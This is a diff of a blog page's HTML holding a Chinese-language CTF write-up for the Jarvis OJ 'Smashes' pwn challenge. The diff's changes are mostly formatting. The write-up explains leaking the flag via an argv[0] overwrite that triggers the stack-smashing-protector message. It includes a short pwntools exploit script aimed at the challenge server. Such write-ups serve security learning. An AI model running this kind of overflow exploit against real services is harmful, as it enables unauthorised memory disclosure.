@@ -21,12 +21,12 @@
     
     
     <meta name="keywords" content="CTF,Pwn">
-    <meta name="description" content="题目信息 Smashes, try your best to smash!!! nc pwn.jarvisoj.com 9877 https:&#x2F;&#x2F;dn.jarvisoj.com&#x2F;challengefiles&#x2F;smashes.44838f6edd4408a53feb2e2bbfe5b229  开了NX和Canary：  静态分析 题目就是简单地接受输入，要求overwrite，但因为有canary不">
+    <meta name="description" content="题目信息 Smashes, try your best to smash!!! nc pwn.jarvisoj.com 9877 https:&#x2F;&#x2F;dn.jarvisoj.com&#x2F;challengefiles&#x2F;smashes.44838f6edd4408a53feb2e2bbfe5b229  开了NX和Canary：">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Smashes">
 <meta property="og:url" content="https://darkwing.moe/2019/07/11/Smashes/index.html">
 <meta property="og:site_name" content="喵喵喵喵">
-<meta property="og:description" content="题目信息 Smashes, try your best to smash!!! nc pwn.jarvisoj.com 9877 https:&#x2F;&#x2F;dn.jarvisoj.com&#x2F;challengefiles&#x2F;smashes.44838f6edd4408a53feb2e2bbfe5b229  开了NX和Canary：  静态分析 题目就是简单地接受输入，要求overwrite，但因为有canary不">
+<meta property="og:description" content="题目信息 Smashes, try your best to smash!!! nc pwn.jarvisoj.com 9877 https:&#x2F;&#x2F;dn.jarvisoj.com&#x2F;challengefiles&#x2F;smashes.44838f6edd4408a53feb2e2bbfe5b229  开了NX和Canary：">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019071101.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019071102.jpg">
 <meta property="og:image" content="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019071103.jpg">
@@ -123,7 +123,7 @@
         
             <li class="waves-block waves-effect">
               <a href="https://darkwing.moe/2015/01/01/about/"  >
-                <i class="icon icon-lg icon-link2"></i>
+                <i class="icon icon-lg icon-link"></i>
                 About
               </a>
             </li>
@@ -218,15 +218,43 @@
 <p><a href="https://dn.jarvisoj.com/challengefiles/smashes.44838f6edd4408a53feb2e2bbfe5b229" target="_blank" rel="noopener">https://dn.jarvisoj.com/challengefiles/smashes.44838f6edd4408a53feb2e2bbfe5b229</a></p>
 </blockquote>
 <p>开了NX和Canary：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019071101.jpg" alt=""></p>
-<h1 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h1><p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019071102.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019071101.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
+<h1 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h1><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019071102.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>题目就是简单地接受输入，要求overwrite，但因为有canary不能直接溢出，那么就可以考虑argv[0] leak，通过溢出覆盖argv[0]的地址，然后根据smashes信息获取覆盖地址的内容</p>
 <p>另外文件中有很像flag的字串，但服务器上肯定不是这串，既然flag就在程序中，那么泄露的内容就确定了，但是程序执行的过程中会把flag给修改了，这里有个小知识，当ELF文件比较小的时候，他的不同区段可能会被多次映射，也就是说flag可能有备份，gdb查找一下 ：</p>
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019071103.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019071103.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 <p>在0x400d21有一处备份，那么我们就可以将argv[0]覆盖为0x400d21，来获取flag的值</p>
 <h1 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./smashes'</span>)</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">'pwn.jarvisoj.com'</span>, <span class="number">9877</span>)</span><br><span class="line"><span class="comment"># sh = process('./smashes')</span></span><br><span class="line">context.arch = elf.arch</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">flag_addr = <span class="number">0x400D20</span></span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"name?"</span>)</span><br><span class="line">payload = p64(flag_addr) * <span class="number">200</span></span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.recvuntil(<span class="string">'flag:'</span>)</span><br><span class="line">sh.sendline(<span class="string">"1"</span>)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019071104.jpg" alt=""></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://raw.githubusercontent.com/zjicmDarkWing/images/master/2019071104.jpg" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+
 
         </div>
 
